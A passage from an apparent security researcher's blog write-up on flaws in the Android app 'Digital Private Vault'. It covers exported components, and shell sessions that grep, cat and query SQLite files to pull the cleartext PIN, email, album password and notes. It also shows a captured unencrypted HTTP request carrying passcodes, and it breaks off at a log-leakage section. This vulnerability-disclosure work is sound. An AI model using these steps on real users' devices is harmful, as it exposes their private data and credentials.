+<div class="language-xml highlighter-rouge"><div class="code-header">
+        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre><span class="nt">&lt;provider</span> <span class="na">android:name=</span><span class="s">"com.techuz.privatevault.widget.ContentProviders.MyFileContentProvider"</span> 
+<span class="na">android:enabled=</span><span class="s">"true"</span> <span class="na">android:exported=</span><span class="s">"true"</span> <span class="na">android:authorities=</span><span class="s">"com.techuz.privatevault"</span><span class="nt">/&gt;</span>
+...
+<span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">"com.facebook.CustomTabActivity"</span> <span class="na">android:exported=</span><span class="s">"true"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;intent-filter&gt;</span>
+        <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.VIEW"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.BROWSABLE"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;data</span> <span class="na">android:scheme=</span><span class="s">"fbconnect"</span> <span class="na">android:host=</span><span class="s">"cct.com.techuz.privatevault"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;/intent-filter&gt;</span>
+<span class="nt">&lt;/activity&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p><a href="/assets/img/digital-private-vault/exported-activities.png" class="popup img-link shimmer"><img src="/assets/img/digital-private-vault/exported-activities.png" alt="exported-activities" loading="lazy"></a>
+<em>MobSF finding</em></p>
+
+<ul>
+  <li>There is one component implicity exported <sup id="fnref:implicit-intent"><a href="#fn:implicit-intent" class="footnote" rel="footnote" role="doc-noteref">6</a></sup>:</li>
+</ul>
+
+<div class="language-xml highlighter-rouge"><div class="code-header">
+        <span data-label-text="XML"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="nt">&lt;receiver</span> <span class="na">android:name=</span><span class="s">"com.techuz.privatevault.service.MyBroadcastReceiver"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;intent-filter&gt;</span>
+        <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"serviceEnds"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;/intent-filter&gt;</span>
+<span class="nt">&lt;/receiver&gt;</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p><a href="/assets/img/digital-private-vault/broadcast-receiver.png" class="popup img-link shimmer"><img src="/assets/img/digital-private-vault/broadcast-receiver.png" alt="broadcast-receiver" loading="lazy"></a>
+<em>MobSF finding</em></p>
+
+<h3 id="internal-folder-structure"><span class="me-2">Internal folder structure</span><a href="#internal-folder-structure" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>The initial folder structure immediately after installing the application is as follows:</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>generic_x86:/ <span class="c">## ls -al /data/data/com.techuz.privatevault/</span>
+total 44
+drwx------   4 u0_a155 u0_a155       4096 2023-06-13 14:34 <span class="nb">.</span>
+drwxrwx--x 182 system  system        8192 2023-06-13 14:34 ..
+drwxrws--x   2 u0_a155 u0_a155_cache 4096 2023-06-13 14:34 cache
+drwxrws--x   2 u0_a155 u0_a155_cache 4096 2023-06-13 14:34 code_cache
+lrwxrwxrwx   1 root    root            70 2023-06-13 14:34 lib -&gt; /data/app/com.techuz.privatevault-m5oxNSMIZSbq3NXMMvdXFg<span class="o">==</span>/lib/x86
+
+generic_x86:/data/data/com.techuz.privatevault <span class="c">## find</span>
+<span class="nb">.</span>
+./cache
+./code_cache
+./lib
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>After starting the application for the first time and setting up email and pin, the folder structure becomes the one below:</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+</pre></td><td class="rouge-code"><pre>generic_x86:/ <span class="c">## ls -al /data/data/com.techuz.privatevault/</span>
+total 68
+drwx------   7 u0_a155 u0_a155       4096 2023-06-13 14:36 <span class="nb">.</span>
+drwxrwx--x 182 system  system        8192 2023-06-13 14:34 ..
+drwxrws--x   2 u0_a155 u0_a155_cache 4096 2023-06-13 14:34 cache
+drwxrws--x   2 u0_a155 u0_a155_cache 4096 2023-06-13 14:34 code_cache
+drwxrwx--x   2 u0_a155 u0_a155       4096 2023-06-13 14:36 databases
+drwxrwx--x   3 u0_a155 u0_a155       4096 2023-06-13 14:36 files
+lrwxrwxrwx   1 root    root            70 2023-06-13 14:34 lib -&gt; /data/app/com.techuz.privatevault-m5oxNSMIZSbq3NXMMvdXFg<span class="o">==</span>/lib/x86
+drwxrwx--x   2 u0_a155 u0_a155       4096 2023-06-13 14:36 shared_prefs
+
+generic_x86:/data/data/com.techuz.privatevault <span class="c">## find</span>
+<span class="nb">.</span>
+./cache
+./code_cache
+./lib
+./files
+./files/.com.google.firebase.crashlytics
+./files/.com.google.firebase.crashlytics/log-files
+./files/.com.google.firebase.crashlytics/log-files/crashlytics-userlog-648862BF028B0001300D8713FF69C011.temp
+./files/.com.google.firebase.crashlytics/report-persistence
+./files/.com.google.firebase.crashlytics/report-persistence/sessions
+./files/.com.google.firebase.crashlytics/report-persistence/sessions/648862BF028B0001300D8713FF69C011
+./files/.com.google.firebase.crashlytics/report-persistence/sessions/648862BF028B0001300D8713FF69C011/report
+./files/.com.google.firebase.crashlytics/report-persistence/sessions/648862BF028B0001300D8713FF69C011/start-time
+./files/.com.google.firebase.crashlytics/com.crashlytics.settings.json
+./files/generatefid.lock
+./files/PersistedInstallation.W0RFRkFVTFRd+MTo1Nzk3OTA4MDI0ODM6YW5kcm9pZDozMGNkMjJjMTU4MDVjNDRlY2M5ZDQ2.json
+./shared_prefs
+./shared_prefs/com.facebook.sdk.appEventPreferences.xml
+./shared_prefs/com.google.android.gms.measurement.prefs.xml
+./shared_prefs/com.google.firebase.crashlytics.xml
+./shared_prefs/FirebaseAppHeartBeat.xml
+./shared_prefs/com.techuz.privatevault_preferences.xml
+./shared_prefs/PV.xml
+./databases
+./databases/com.google.android.datatransport.events
+./databases/com.google.android.datatransport.events-journal
+./databases/google_app_measurement_local.db
+./databases/google_app_measurement_local.db-journal
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="vulnerabilities"><span class="me-2">Vulnerabilities</span><a href="#vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<h3 id="cleartext-storage-of-sensitive-information"><span class="me-2">Cleartext storage of sensitive information</span><a href="#cleartext-storage-of-sensitive-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<blockquote class="bug">
+  <p>The product stores sensitive information in cleartext within a resource that might be accessible to another control sphere.</p>
+</blockquote>
+
+<p>The first thing I did after setting up the vault was search for hardcoded secrets inside the application folder. In our case, the PIN, the personal email, and the password were good candidates, so I started grepping for those, discovering that they are stored as they are, without any encryption or protection.</p>
+
+<p>The user’s email, as well as the PIN, are stored within <code class="language-plaintext highlighter-rouge">/shared_prefs/PV.xml</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>generic_x86:/data/data/com.techuz.privatevault <span class="c">## grep -r "1234" .</span>
+./shared_prefs/PV.xml:    &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"PASSCODE"</span><span class="o">&gt;</span>1234&lt;/string&gt;
+generic_x86:/data/data/com.techuz.privatevault <span class="c">## grep -r "0xbro.red" .</span>
+./shared_prefs/PV.xml:    &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"PV_EMAIL"</span><span class="o">&gt;</span>0xbro.red@yopmail.com&lt;/string&gt;
+generic_x86:/data/data/com.techuz.privatevault <span class="c">## cat ./shared_prefs/PV.xml</span>
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s1">'1.0'</span> <span class="nv">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span> <span class="nv">standalone</span><span class="o">=</span><span class="s1">'yes'</span> ?&gt;
+&lt;map&gt;
+    &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"PV_EMAIL"</span><span class="o">&gt;</span>0xbro.red@yopmail.com&lt;/string&gt;
+    &lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"PASSCODE"</span><span class="o">&gt;</span>1234&lt;/string&gt;
+&lt;/map&gt;
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Album’s passwords, instead, are stored inside an SQLite database:</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>generic_x86:/data/data/com.techuz.privatevault <span class="c">## grep -r "s3cr3t!" .</span>
+Binary file ./databases/MyDBName.db matches
+1|generic_x86:/data/data/com.techuz.privatevault <span class="c">## sqlite3 ./databases/MyDBName.db</span>
+SQLite version 3.22.0 2018-12-19 01:30:22
+Enter <span class="s2">".help"</span> <span class="k">for </span>usage hints.
+sqlite&gt; .tables
+Files             SubDirectory      android_metadata
+Notes
+sqlite&gt; <span class="k">select</span> <span class="k">*</span> from SubDirectory<span class="p">;</span>
+1|1|Secret Album|/data/user/0/com.techuz.privatevault/app_privateVault/images/Secret Album|s3cr3t!
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>After finding out how the application saved pins and passwords, I wondered how “secret” pictures and notes were saved. I imported an image into an album, created a new note, and started searching in the same way as I did before.</p>
+
+<p>The folder structure now looks like this:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>generic_x86:/data/data/com.techuz.privatevault <span class="c">## ls -al</span>
+total 92
+drwx------  10 u0_a156 u0_a156       4096 2023-06-13 14:58 <span class="nb">.</span>
+drwxrwx--x 182 system  system        8192 2023-06-13 14:41 ..
+drwxrwx--x   4 u0_a156 u0_a156       4096 2023-06-13 14:58 app_privateVault
+drwxrwx--x   2 u0_a156 u0_a156       4096 2023-06-13 14:43 app_textures
+drwx------   3 u0_a156 u0_a156       4096 2023-06-13 14:43 app_webview
+drwxrws--x   5 u0_a156 u0_a156_cache 4096 2023-06-13 14:58 cache
+drwxrws--x   2 u0_a156 u0_a156_cache 4096 2023-06-13 14:41 code_cache
+drwxrwx--x   2 u0_a156 u0_a156       4096 2023-06-13 14:58 databases
+drwxrwx--x   3 u0_a156 u0_a156       4096 2023-06-13 14:43 files
+lrwxrwxrwx   1 root    root            70 2023-06-13 14:41 lib -&gt; /data/app/com.techuz.privatevault-9Z6nlf_ZcpzYg8akloQUYQ<span class="o">==</span>/lib/x86
+drwxrwx--x   2 u0_a156 u0_a156       4096 2023-06-13 16:11 shared_prefs
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Photos and videos imported inside the vault are simply stored within <code class="language-plaintext highlighter-rouge">app_privateVault</code> without any kind of protection:</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>generic_x86:/data/data/com.techuz.privatevault <span class="c">## find app_privateVault/</span>
+app_privateVault/
+app_privateVault/images
+app_privateVault/images/Secret Album
+app_privateVault/images/Secret Album/1686661132501.jpg
+app_privateVault/images/Secret Album/1686661147557.jpg
+app_privateVault/images/Secret Album/1686661447174.jpg
+app_privateVault/videos
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Notes, on the other hand, are saved in the same SQLite file (<code class="language-plaintext highlighter-rouge">MyDBName.db</code>) where we found album passwords:</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>1|generic_x86:/data/data/com.techuz.privatevault <span class="c">## grep -r secret .</span>
+Binary file ./databases/MyDBName.db matches
+1|generic_x86:/data/data/com.techuz.privatevault <span class="c">## sqlite3 ./databases/MyDBName.db</span>
+SQLite version 3.22.0 2018-12-19 01:30:22
+Enter <span class="s2">".help"</span> <span class="k">for </span>usage hints.
+sqlite&gt; <span class="k">select</span> <span class="k">*</span> from notes<span class="p">;</span>
+1|Find me <span class="k">if </span>you can.|This is a secret notes that should not be <span class="nb">read </span>by anyone|2023-06-13 03:57:17 PM
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Looking at the <code class="language-plaintext highlighter-rouge">strings.xml</code> file, you can also find some hardcoded API key:</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>privateVault/res/values/strings.xml
+...
+&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"google_api_key"</span><span class="o">&gt;</span>AIzaSyDth7hjwe8p-redacted-&lt;/string&gt;
+&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"google_app_id"</span><span class="o">&gt;</span>1:579790802483:android:30cd22c15805c44ecc9d46&lt;/string&gt;
+&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"google_crash_reporting_api_key"</span><span class="o">&gt;</span>AIzaSyDth7hjwe8p-redacted-&lt;/string&gt;
+&lt;string <span class="nv">name</span><span class="o">=</span><span class="s2">"google_storage_bucket"</span><span class="o">&gt;</span>digital-private-vault.appspot.com&lt;/string&gt;
+...
+</pre></td></tr></tbody></table></code></div></div>
+
+<h3 id="cleartext-transmission-of-sensitive-information"><span class="me-2">Cleartext transmission of sensitive information</span><a href="#cleartext-transmission-of-sensitive-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<blockquote class="bug">
+  <p>The product transmits sensitive or security-critical data in cleartext in a communication channel that can be sniffed by unauthorized actors.</p>
+</blockquote>
+
+<p>The application allows users to get forgotten PINs or passwords through their email. That information, however, is communicated to the server using an unencrypted channel (as for all other communications to the server), exposing them to third parties.</p>
+
+<p>The application first checks that the email is the same as the one used by the user during registration (stored locally inside <code class="language-plaintext highlighter-rouge">shared_prefs/PV.xml</code>):</p>
+<div class="language-java highlighter-rouge"><div class="code-header">
+        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre><span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">inputValidation</span><span class="o">(</span><span class="nc">String</span> <span class="n">email</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">email</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">et_email</span><span class="o">.</span><span class="na">setError</span><span class="o">(</span><span class="s">"Email is required"</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">et_email</span><span class="o">.</span><span class="na">requestFocus</span><span class="o">();</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(!</span><span class="nc">Patterns</span><span class="o">.</span><span class="na">EMAIL_ADDRESS</span><span class="o">.</span><span class="na">matcher</span><span class="o">(</span><span class="n">email</span><span class="o">).</span><span class="na">matches</span><span class="o">())</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">et_email</span><span class="o">.</span><span class="na">setError</span><span class="o">(</span><span class="s">"Invalid email"</span><span class="o">);</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">et_email</span><span class="o">.</span><span class="na">requestFocus</span><span class="o">();</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="nc">Utility</span><span class="o">.</span><span class="na">getStringPreference</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="nc">Constants</span><span class="o">.</span><span class="na">PREF_KEY_EMAIL</span><span class="o">,</span> <span class="s">""</span><span class="o">).</span><span class="na">equals</span><span class="o">(</span><span class="n">email</span><span class="o">))</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="nc">Toast</span><span class="o">.</span><span class="na">makeText</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="s">"Entered email does not match to registered email"</span><span class="o">,</span> <span class="mi">0</span><span class="o">).</span><span class="na">show</span><span class="o">();</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>Then it sends the HTTP POST request to the server (52.15.243.62:3000) containing the private information within the body:</p>
+<div class="language-java highlighter-rouge"><div class="code-header">
+        <span data-label-text="Java"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+</pre></td><td class="rouge-code"><pre><span class="kd">public</span> <span class="kt">void</span> <span class="nf">callForgotPasswordApi</span><span class="o">(</span><span class="nc">String</span> <span class="n">email</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">showProgressDialog</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+    <span class="nc">APIService</span> <span class="n">client</span> <span class="o">=</span> <span class="n">getClient</span><span class="o">(</span><span class="nc">Constants</span><span class="o">.</span><span class="na">BASE_URL</span><span class="o">);</span>
+    <span class="nc">HashMap</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">();</span>
+    <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"email"</span><span class="o">,</span> <span class="n">email</span><span class="o">);</span>
+    <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">albumName</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="o">.</span><span class="na">albumPasscode</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"AlbumName"</span><span class="o">,</span> <span class="s">"********** AlbumName : "</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">albumName</span> <span class="o">+</span> <span class="s">" **************************"</span><span class="o">);</span>
+        <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"Passcode"</span><span class="o">,</span> <span class="s">"********** Passcode : "</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">albumPasscode</span> <span class="o">+</span> <span class="s">" **************************"</span><span class="o">);</span>
+        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"album_name"</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">albumName</span><span class="o">);</span>
+        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"passcode"</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">albumPasscode</span><span class="o">);</span>
+        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"device_name"</span><span class="o">,</span> <span class="nc">Utility</span><span class="o">.</span><span class="na">getDeviceName</span><span class="o">());</span>
+        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"device_os"</span><span class="o">,</span> <span class="s">"Android"</span><span class="o">);</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"app_version"</span><span class="o">,</span> <span class="n">getPackageManager</span><span class="o">().</span><span class="na">getPackageInfo</span><span class="o">(</span><span class="n">getPackageName</span><span class="o">(),</span> <span class="mi">0</span><span class="o">).</span><span class="na">versionName</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">PackageManager</span><span class="o">.</span><span class="na">NameNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="nc">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="s">""</span><span class="o">,</span> <span class="s">"device_name:"</span> <span class="o">+</span> <span class="nc">Utility</span><span class="o">.</span><span class="na">getDeviceName</span><span class="o">());</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="nc">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="s">""</span><span class="o">,</span> <span class="s">"app_version:"</span> <span class="o">+</span> <span class="n">getPackageManager</span><span class="o">().</span><span class="na">getPackageInfo</span><span class="o">(</span><span class="n">getPackageName</span><span class="o">(),</span> <span class="mi">0</span><span class="o">).</span><span class="na">versionName</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">PackageManager</span><span class="o">.</span><span class="na">NameNotFoundException</span> <span class="n">unused</span><span class="o">)</span> <span class="o">{</span>
+        <span class="o">}</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="nc">String</span> <span class="n">string</span> <span class="o">=</span> <span class="n">getSharedPreferences</span><span class="o">(</span><span class="nc">Constants</span><span class="o">.</span><span class="na">NOTIFICATION_CHANNEL_ID</span><span class="o">,</span> <span class="mi">0</span><span class="o">).</span><span class="na">getString</span><span class="o">(</span><span class="s">"PASSCODE"</span><span class="o">,</span> <span class="s">""</span><span class="o">);</span>
+        <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"Passcode"</span><span class="o">,</span> <span class="s">"********** Passcode : "</span> <span class="o">+</span> <span class="n">string</span> <span class="o">+</span> <span class="s">" **************************"</span><span class="o">);</span>
+        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"passcode"</span><span class="o">,</span> <span class="n">string</span><span class="o">);</span>
+        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"device_name"</span><span class="o">,</span> <span class="nc">Utility</span><span class="o">.</span><span class="na">getDeviceName</span><span class="o">());</span>
+        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"device_os"</span><span class="o">,</span> <span class="s">"Android"</span><span class="o">);</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"app_version"</span><span class="o">,</span> <span class="n">getPackageManager</span><span class="o">().</span><span class="na">getPackageInfo</span><span class="o">(</span><span class="n">getPackageName</span><span class="o">(),</span> <span class="mi">0</span><span class="o">).</span><span class="na">versionName</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">PackageManager</span><span class="o">.</span><span class="na">NameNotFoundException</span> <span class="n">e2</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e2</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="nc">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="s">""</span><span class="o">,</span> <span class="s">"device_name:"</span> <span class="o">+</span> <span class="nc">Utility</span><span class="o">.</span><span class="na">getDeviceName</span><span class="o">());</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="nc">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="s">""</span><span class="o">,</span> <span class="s">"app_version:"</span> <span class="o">+</span> <span class="n">getPackageManager</span><span class="o">().</span><span class="na">getPackageInfo</span><span class="o">(</span><span class="n">getPackageName</span><span class="o">(),</span> <span class="mi">0</span><span class="o">).</span><span class="na">versionName</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">PackageManager</span><span class="o">.</span><span class="na">NameNotFoundException</span> <span class="n">e3</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e3</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>The resulting HTTP request is the following one:</p>
+
+<div class="language-http highlighter-rouge"><div class="code-header">
+        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/api/forgotpass</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">163</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">52.15.243.62:3000</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">okhttp/3.12.1</span>
+
+device_name=Google%20Android%20SDK%20built%20for%20x86&amp;app_version=1.6&amp;album_name=Secret%20Album&amp;device_os=Android&amp;email=0xbro.red%40yopmail.com&amp;passcode=s3cr3t%21
+</pre></td></tr></tbody></table></code></div></div>
+<h3 id="sensitive-data-leakage-in-log-files"><span class="me-2">Sensitive data leakage in log files</span><a href="#sensitive-data-leakage-in-log-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<blockquote class="bug">
+  <p>The application stores passwords and pins inside logs, exposing them to unathorized actors.</p>
+</blockquote>
+
+<p>The application writes inside logs every HTTP request sent to the server. Because sensitive information is sent inside those requests, the same information is also stored inside logs, allowing anyone with physical access to the device to obtain them:</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
